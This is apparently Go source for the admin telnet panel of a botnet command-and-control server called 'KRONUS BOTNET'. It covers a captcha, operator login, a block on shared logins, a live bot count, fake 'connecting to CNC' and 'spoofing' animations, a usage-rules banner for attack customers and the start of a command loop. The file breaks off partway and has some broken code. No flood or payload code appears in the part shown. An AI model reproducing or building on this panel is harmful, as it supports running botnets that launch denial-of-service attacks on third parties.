package main

import (
    "fmt"
    "strings"
    "net"
	"strconv"
    "io/ioutil"
	"math/rand"
	"net/http"
	"time"

)

var(
	sessionLogger, _ = gologger.New("SharingLogger", 10, gologger.PanicIfFileError)
    logger, _        = gologger.New("ServerLogger", 10, gologger.PanicIfFileError)
)
type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()
      	if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; KRONUS BOTNET | Human Verification\007"))); err != nil {
		this.conn.Close()
	}

	/*--------------------------------------------------------------------------------------------------------------------------------------------*/

	var code int
	code = (rand.Intn(9)+1)*1000 + (rand.Intn(9)+1)*100 + (rand.Intn(9)+1)*10 + rand.Intn(10)
	this.conn.SetDeadline(time.Now().Add(20 * time.Second))
	this.conn.Write([]byte("\033[0m\r\n"))
	this.conn.Write([]byte("\033[0mPlease Enter The Given Captcha Code.\r\n"))
	this.conn.Write([]byte("\033[0m\r\n"))
	this.conn.Write([]byte("\033[00;1;95mCaptcha - \033[1;49;35m" + strconv.Itoa(code) + "\033[0m: "))
	pin, err := this.ReadLine(false)
	this.conn.Write([]byte("\033[0m\r\n"))

	if err != nil || len(pin) != 4 {
		this.conn.Write([]byte("\r\033[1;49;35mCaptcha Incorrect\033[0m\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}

	cc, err := strconv.Atoi(pin)
	if err != nil || cc != code {
		this.conn.Write([]byte("\r\033[1;49;35mCaptcha Incorrect\033[0m\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}          
				if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; WELCOME TO KRONUS BOTNET \007"))); err != nil {//35m
                this.conn.Close()
            }
    // Get username
    this.conn.SetDeadline(time.Now().Add(10 * time.Second))
    this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))                     
            this.conn.Write([]byte("\033[1;49;35m                                                                        \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                                                                        \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ┬┌─ ┌─┐ ┌─┐ ┌┐┌ ┬ ┬ ┌─┐  ┌┐  ┌─┐ ┌┬┐ ┌┐┌ ┌─┐┌┬┐                  \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ├┴┐ ├┰┘ │ │ │││ │ │ └─┐  ├┴┐ │ │  │  │││ ├┤  │                  \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ┴ ┴ ┴┕─ └─┘ ┘└┘ └─┘ └─┘  └─┘ └─┘  ┴  ┘└┘ └─┘ ┴                  \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                   [+]Please Type In Your Login Information[+]                 \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m ---------------------------------------------------------------------- \033[0m \r\n"))                                             
            this.conn.Write([]byte("\033[1;49;35m                                                                        \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                                                                        \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                                                                        \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                               ║Username ════\033[37m⮞ \x1b[37m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(10 * time.Second))
    this.conn.Write([]byte("\033[1;49;35m                               ║Password ════\033[37m⮞ \033[1;49;35m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }
    //Attempt  Login
    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[1;49;35mAttempting To Login... \033[1;31m[\033[0;37m Confirming Login Credentials... \033[1;31m] \033[0;31m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }
    this.conn.Write([]byte("\r\n"))
    	for _, session := range sessions {
		if session.Username == username {
		sessionLogger.WriteString(time.Now().Format("Jan 2 15:04:05"), username, "[Sharing Detected] -", this.conn.LocalAddr())
fmt.Println(this.conn, "Sharing detected")
		return
		}
	}

	var session = &session{
		ID:       time.Now().UnixNano(),
		Username: username,
		Conn:     this.conn,
	}

	sessionMutex.Lock()
	sessions[session.ID] = session
	sessionMutex.Unlock()

	defer session.Remove()

	
	var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
        this.conn.Write([]byte("\r\033[00;31m                               ║Wrong Login Or Your Banned\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }
 
            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; %d ~ Demon Slayers | Demon Slayer Logged in---> %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[1;49;35m                                                                      \r\n"))
            this.conn.Write([]byte("\033[1;49;35m     CONNECTING TO CNC █                                              \r\n"))
            this.conn.Write([]byte("\033[1;49;35m     CONNECTING TO CNC █                                              \r\n"))
            this.conn.Write([]byte("\033[1;49;35m     CONNECTING TO CNC █                                              \r\n"))
            this.conn.Write([]byte("\033[1;49;35m     CONNECTING TO CNC █                                              \r\n"))
            this.conn.Write([]byte("\033[1;49;35m     CONNECTING TO CNC █                                              \r\n"))
            this.conn.Write([]byte("\033[1;49;35m     CONNECTING TO CNC █                                              \r\n"))
            this.conn.Write([]byte("\033[1;49;35m     CONNECTING TO CNC █                                              \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                                                                      \r\n"))
            this.conn.Write([]byte("\033[1;49;35m    `                     `                                           \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[1;49;35m                                                                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m     CONNECTING TO CNC ████                                            \r\n")) 
            this.conn.Write([]byte("\033[1;49;35m     CONNECTING TO CNC ████                                            \r\n"))
            this.conn.Write([]byte("\033[1;49;35m     CONNECTING TO CNC ████                                            \r\n"))
            this.conn.Write([]byte("\033[1;49;35m     CONNECTING TO CNC ████                                            \r\n"))
            this.conn.Write([]byte("\033[1;49;35m     CONNECTING TO CNC ████                                            \r\n"))
            this.conn.Write([]byte("\033[1;49;35m     CONNECTING TO CNC ████                                            \r\n"))
            this.conn.Write([]byte("\033[1;49;35m     CONNECTING TO CNC ████                                            \r\n"))
            this.conn.Write([]byte("\033[1;49;35m     CONNECTING TO CNC ████                                            \r\n"))
            this.conn.Write([]byte("\033[1;49;35m      `                     `                                          \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[32m                                                                       \r\n"))
            this.conn.Write([]byte("\033[32m     CONNECTING TO CNC ████████ .                                      \r\n"))
            this.conn.Write([]byte("\033[32m     CONNECTING TO CNC ████████                                        \r\n"))
            this.conn.Write([]byte("\033[32m     CONNECTING TO CNC ████████                                        \r\n"))
            this.conn.Write([]byte("\033[32m     CONNECTING TO CNC ████████                                        \r\n"))
            this.conn.Write([]byte("\033[32m     CONNECTING TO CNC ████████                                        \r\n"))
            this.conn.Write([]byte("\033[32m     CONNECTING TO CNC ████████                                        \r\n"))
            this.conn.Write([]byte("\033[32m     CONNECTING TO CNC ████████                                        \r\n"))
            this.conn.Write([]byte("\033[32m     CONNECTING TO CNC ████████                                        \r\n"))
            this.conn.Write([]byte("\033[32m        `                     `                                        \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[1;49;35m                                                                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m     CONNECTING TO CNC █████████████                                   \r\n"))
            this.conn.Write([]byte("\033[1;49;35m     CONNECTING TO CNC █████████████                                   \r\n"))
            this.conn.Write([]byte("\033[1;49;35m     CONNECTING TO CNC █████████████                                   \r\n"))
            this.conn.Write([]byte("\033[1;49;35m     CONNECTING TO CNC █████████████                                   \r\n"))
            this.conn.Write([]byte("\033[1;49;35m     CONNECTING TO CNC █████████████                                   \r\n"))
            this.conn.Write([]byte("\033[1;49;35m     CONNECTING TO CNC █████████████                                   \r\n"))
            this.conn.Write([]byte("\033[1;49;35m     CONNECTING TO CNC █████████████                                   \r\n"))
            this.conn.Write([]byte("\033[1;49;35m     CONNECTING TO CNC █████████████                                   \r\n"))
            this.conn.Write([]byte("\033[1;49;35m            `                     `                                    \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                                                                       \r\n"))
            this.conn.Write([]byte("\033[37m      CONNECTING TO CNC ████████████████                               \r\n"))
            this.conn.Write([]byte("\033[37m      CONNECTING TO CNC ████████████████                               \r\n"))
            this.conn.Write([]byte("\033[37m      CONNECTING TO CNC ████████████████                               \r\n"))
            this.conn.Write([]byte("\033[37m      CONNECTING TO CNC ████████████████                               \r\n"))
            this.conn.Write([]byte("\033[37m      CONNECTING TO CNC ████████████████                               \r\n"))
            this.conn.Write([]byte("\033[37m      CONNECTING TO CNC ████████████████                               \r\n"))
            this.conn.Write([]byte("\033[37m      CONNECTING TO CNC ████████████████                               \r\n"))
            this.conn.Write([]byte("\033[37m                                                                       \r\n"))
            this.conn.Write([]byte("\033[37m               `                     `                                 \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[34m                                                                       \r\n"))
            this.conn.Write([]byte("\033[34m      CONNECTING TO CNC ███████████████████                            \r\n"))
            this.conn.Write([]byte("\033[34m      CONNECTING TO CNC ███████████████████                            \r\n"))
            this.conn.Write([]byte("\033[34m      CONNECTING TO CNC ███████████████████                            \r\n"))
            this.conn.Write([]byte("\033[34m      CONNECTING TO CNC ███████████████████                            \r\n"))
            this.conn.Write([]byte("\033[34m      CONNECTING TO CNC ███████████████████                            \r\n"))
            this.conn.Write([]byte("\033[34m      CONNECTING TO CNC ███████████████████                            \r\n"))
            this.conn.Write([]byte("\033[34m      CONNECTING TO CNC ███████████████████                            \r\n"))
            this.conn.Write([]byte("\033[34m      CONNECTING TO CNC ███████████████████                            \r\n"))
            this.conn.Write([]byte("\033[34m                      `                     `                          \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[1;49;35m                                                                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m      CONNECTING TO CNC ████████████████████████                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m      CONNECTING TO CNC ████████████████████████                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m      CONNECTING TO CNC ████████████████████████                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m      CONNECTING TO CNC ████████████████████████                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m      CONNECTING TO CNC ████████████████████████                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m      CONNECTING TO CNC ████████████████████████                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m      CONNECTING TO CNC ████████████████████████                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m      CONNECTING TO CNC ████████████████████████                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                          `                     `                      \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[34m                                                                       \r\n"))
            this.conn.Write([]byte("\033[34m      CONNECTING TO CNC ████████████████████████████████               \r\n"))
            this.conn.Write([]byte("\033[34m      CONNECTING TO CNC ████████████████████████████████               \r\n"))
            this.conn.Write([]byte("\033[34m      CONNECTING TO CNC ████████████████████████████████               \r\n"))
            this.conn.Write([]byte("\033[34m      CONNECTING TO CNC ████████████████████████████████               \r\n"))
            this.conn.Write([]byte("\033[34m      CONNECTING TO CNC ████████████████████████████████               \r\n"))
            this.conn.Write([]byte("\033[34m      CONNECTING TO CNC ████████████████████████████████               \r\n"))
            this.conn.Write([]byte("\033[34m      CONNECTING TO CNC ████████████████████████████████               \r\n"))
            this.conn.Write([]byte("\033[34m      CONNECTING TO CNC ████████████████████████████████               \r\n"))
            this.conn.Write([]byte("\033[34m                          `                     `                      \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
			time.Sleep(100 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[1;49;35m                                                                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m      -CONNECTION SUCCESSFUL-                                          \r\n"))
            this.conn.Write([]byte("\033[1;49;35m        SPOOFING CONNECTION------> ████████                            \r\n"))
            this.conn.Write([]byte("\033[1;49;35m        SPOOFING CONNECTION------> ████████                            \r\n"))
            this.conn.Write([]byte("\033[1;49;35m        SPOOFING CONNECTION------> ████████                            \r\n"))
            this.conn.Write([]byte("\033[1;49;35m        SPOOFING CONNECTION------> ████████                            \r\n"))
            this.conn.Write([]byte("\033[1;49;35m        SPOOFING CONNECTION------> ████████                            \r\n"))
            this.conn.Write([]byte("\033[1;49;35m        SPOOFING CONNECTION------> ████████                            \r\n"))
            this.conn.Write([]byte("\033[1;49;35m        SPOOFING CONNECTION------> ████████                            \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                                    `                                  \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[32m                                                                       \r\n"))
            this.conn.Write([]byte("\033[32m      -CONNECTION SUCCESSFUL-                                          \r\n"))
            this.conn.Write([]byte("\033[32m        SPOOFING CONNECTION--------> ████████████████                  \r\n"))
            this.conn.Write([]byte("\033[32m        SPOOFING CONNECTION--------> ████████████████                  \r\n"))
            this.conn.Write([]byte("\033[32m        SPOOFING CONNECTION--------> ████████████████                  \r\n"))
            this.conn.Write([]byte("\033[32m        SPOOFING CONNECTION--------> ████████████████                  \r\n"))
            this.conn.Write([]byte("\033[32m        SPOOFING CONNECTION--------> ████████████████                  \r\n"))
            this.conn.Write([]byte("\033[32m        SPOOFING CONNECTION--------> ████████████████                  \r\n"))
            this.conn.Write([]byte("\033[32m        SPOOFING CONNECTION--------> ████████████████                  \r\n"))
            this.conn.Write([]byte("\033[32m                               `                     `                 \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[34m                                                                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m               --CONNECTION AS BEEN (ESTABILISHED)--                   \r\n"))
            this.conn.Write([]byte("\033[34m       SPOOFING CONNECTION----------> ████████████████████████████     \r\n"))
            this.conn.Write([]byte("\033[34m       SPOOFING CONNECTION----------> ████████████████████████████     \r\n"))
            this.conn.Write([]byte("\033[34m       SPOOFING CONNECTION----------> ████████████████████████████     \r\n"))
            this.conn.Write([]byte("\033[34m       SPOOFING CONNECTION----------> ████████████████████████████     \r\n"))
            this.conn.Write([]byte("\033[34m       SPOOFING CONNECTION----------> ████████████████████████████     \r\n"))
            this.conn.Write([]byte("\033[34m       SPOOFING CONNECTION----------> ████████████████████████████     \r\n"))
            this.conn.Write([]byte("\033[34m       SPOOFING CONNECTION----------> ████████████████████████████     \r\n"))
            this.conn.Write([]byte("\033[1;49;35m      -------------   TYPE CLS TO CLEAR THIS LOG      -------------\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠍⢁⠄⠻⠟⠄⠄⠄⠄⠄⠄⠄⠙⠿⠿⠋⠄⠄⠄⠄⠄⠈⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢃⠄⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠠⠶⣶⡶⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣽⣿⠟⠄⠄⠄⠄⣀⣤⣀⣀⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠄⢀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠸⣿⣿⣿⣿⣿ ⮞\033[1;49;32mNO SPAMMING ATTACKS\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡀⠄⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢻⣿⣿⣿\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⣔⣤⣤⣬⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⣀⣤⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠠⠹⣿⣿ ⮞\033[1;49;32mNO SENDING ATTACKS TO A IP\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣿⠏⠏⠄⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡛⠻⣿⣿⣿⣿⣷⠄⠄⠻⣿⣧⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢰⣶⣶⣷⢹⣿  \033[1;49;32mYOUR ALREADY ATTACKING\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣿⣳⠄⠄⣈⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⢝⣿⣿⣿⡆⠄⠄⠈⠉⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⢘⣿\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⣳⠇⠄⠠⠖⠉⠌⢫⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡽⣿⣷⠄⠄⠄⠄⠄⠄⠄⠄⠄⣀⣤⣄⠄⠄⠄⠄⠄⢸⠘⣾ ⮞\033[1;49;32mNO SHARING LOGINS\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣷⣿⠄⠄⢠⣿⣀⣄⡀⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣽⣿⡀⠄⠄⠄⠄⠄⠄⡠⣺⣿⣿⣿⠗⠄⠄⠄⠄⢸⡇⢹\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⡿⣿⠄⢠⢘⣷⣿⣻⣿⣿⣿⣿⣿⣿⡿⠿⠑⠬⠈⢙⣽⣿⣿⣿⣿⣿⣧⠄⠄⠄⢀⠦⠄⣚⠉⠉⠁⠄⠄⠄⠄⠄⠄⢸⡇⢸ ⮞\033[1;49;32mNO LEAKING NET INFO\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⠿⡅⣹⡇⢠⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠄⠄⠁⢘⢟⣿⣿⣿⡟⠄⠄⠄⠈⠉⠁⢻⣦⠄⠄⠄⠄⠄⠄⠄⠄⣸⡇⣸\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⢏⣾⡇⣿⠄⣿⣿⣿⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣷⣷⣔⢀⣀⡀⠸⣿⣿⠟⠄⠄⠄⠄⠄⠄⠄⠄⠿⣷⡀⠄⠄⠄⢀⣠⣦⣿⡟⣿ ⮞\033[1;49;32mNO HITTING GOVERMENT SITES\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣏⣿⣿⡇⣿⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣶⣿⡟⠸⡿⠅⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠉⠙⠂⠄⠄⠙⠛⠛⣿⣹⡇\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m⢹⣿⣿⡇⡏⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣯⣭⣭⣵⡶⣣⡞⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢠⣇⣽⠃ ⮞\033[1;49;32mNO DSTATS\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣼⣿⣿⣿⡀⠸⣿⣿⣿⣟⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢋⣾⠏⠄⠄⠄⠄⠄⠰⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⣸⣿⠏⢰\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⣿⠄⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣡⣿⠏⠄⠄⠄⠄⠄⠄⡾⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⣿⣿⣰⣿\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⣿⡃⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢱⣿⠏⠄⠄⠄⠄⠄⠄⠄⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡄⢹⣿⣿ ⮞\033[1;49;32mPLEASE TYPE I AGREE\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⡇⡇⠄⠈⠙⠛⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⠏⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢰⠁⠘⣿⣿\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣟⣿⢀⡇⠄⠄⠄⠄⠄⠄⠄⠄⢀⠄⠄⠄⠄⠂⠄⠉⣄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⠄⣧⠄⢻⣿\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m⢯⣿⣿⢸⡇⠄⡄⠄⠄⠄⠄⠄⠄⠄⢳⡄⣀⣤⣶⣾⣿⣿⡄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣆⢿⣷⠄⢻\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⢸⡇⢸⠁⠄⠄⠄⠄⠄⠄⠄⠄⢻⣿⣿⣿⣿⣿⣿⡇⠆⠄⠄⠄⠄⠄⠄⢠⣴⣶⠟⠄⠄⢀⣤⣤⣤⠄⠄⠄⠄⠸⢿⡘⣿⣷⡀\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣷⣿⣿⢸⡇⣸⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿⣿⣿⣿⡿⣣⡐⠄⠄⠄⠄⠄⠄⠙⠛⠁⠄⠄⠄⠄⠄⠁⠄⠄⠄⠄⠄⠄⠈⣿⣿⣿⣿\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⡌⡇⡇⠄⢀⠄⠄⠄⠄⠄⢀⣶⡷⢻⣿⡿⣟⣵⣿⣿⣧⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢣⠈⠻⣿⣿\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m⣿⣿⣿⡇⠄⠁⢰⣿⠁⠄⠄⠄⠄⣿⣿⢹⢸⢿⣿⣿⣿⣿⣿⢿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢢⣾⠄⠑\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m~~~~~~~~~~~~~~~~~~~~⮞"))	  
		    rules, err := this.ReadLine(false)
		    if err != nil {
			   return
		  }

		rules = strings.ToLower(rules)

		if rules != "I AGREE" && rules != "i agree" {
			fmt.Fprintln(this.conn, "                             ║\033[31mYou Must Agree To Continue!\033[0m\r")
			time.Sleep(time.Duration(2000) * time.Millisecond)
			return
		}

		if len(rules) > 7 {
			return
		}
	     /*--------------------------------------------------------------------------------------------------------------------------------------------*/        
				this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[34m                                                                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m               --CONNECTION AS BEEN (ESTABILISHED)--                   \r\n"))
            this.conn.Write([]byte("\033[34m       SPOOFING CONNECTION----------> ████████████████████████████     \r\n"))
            this.conn.Write([]byte("\033[34m       SPOOFING CONNECTION----------> ████████████████████████████     \r\n"))
            this.conn.Write([]byte("\033[34m       SPOOFING CONNECTION----------> ████████████████████████████     \r\n"))
            this.conn.Write([]byte("\033[34m       SPOOFING CONNECTION----------> ████████████████████████████     \r\n"))
            this.conn.Write([]byte("\033[34m       SPOOFING CONNECTION----------> ████████████████████████████     \r\n"))
            this.conn.Write([]byte("\033[34m       SPOOFING CONNECTION----------> ████████████████████████████     \r\n"))
            this.conn.Write([]byte("\033[34m       SPOOFING CONNECTION----------> ████████████████████████████     \r\n"))
            this.conn.Write([]byte("\033[1;49;35m      -------------   TYPE CLS TO CLEAR THIS LOG      -------------\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
	
	   /*--------------------------------------------------------------------------------------------------------------------------------------------*/
	
	        for {
            var botCatagory string
            var botCount int
            this.conn.Write([]byte("\033[1;49;35m║══════✨KRONUS✨══════║\033[2;49;91m"))
            this.conn.Write([]byte("\033[1;49;35m║════⮞\033[2;49;91m"))
		    cmd, err := this.ReadLine(false)
  /*--------------------------------------------------------------------------------------------------------------------------------------------*/           
			if err != nil || cmd == "LOGOUT" || cmd == "logout" {
               return
          }
          if cmd == "" {
            continue
        }

 /*--------------------------------------------------------------------------------------------------------------------------------------------*/
        if err != nil || cmd == "CLEAR" || cmd == "clear" || cmd == "cls" || cmd == "CLS" || cmd == "c" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))                                                                                       
            this.conn.Write([]byte("\033[1;49;35m\033[0m \r\n"))
